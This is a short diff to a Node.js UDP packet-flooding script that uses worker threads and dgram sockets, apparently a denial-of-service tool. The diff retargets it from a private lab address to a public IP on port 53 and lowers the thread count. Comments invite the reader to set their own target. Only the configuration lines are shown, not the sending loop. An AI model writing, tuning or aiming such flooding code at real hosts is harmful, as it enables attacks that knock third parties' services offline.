@@ -1,10 +1,10 @@
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const dgram = require('dgram');
 
-const TARGET = '192.168.1.100';  // Change to your target IP
-const PORT = 1234;                // Change to your target port
+const TARGET = '194.49.53.89';  // Change to your target IP
+const PORT = 53;                // Change to your target port
 const PACKET_SIZE = 32;           // Smaller packet size (to prevent overload)
-const THREADS = 20;               // Number of worker threads (1 per vCPU)
+const THREADS = 2;               // Number of worker threads (1 per vCPU)
 
 if (isMainThread) {
     for (let i = 0; i < THREADS; i++) {
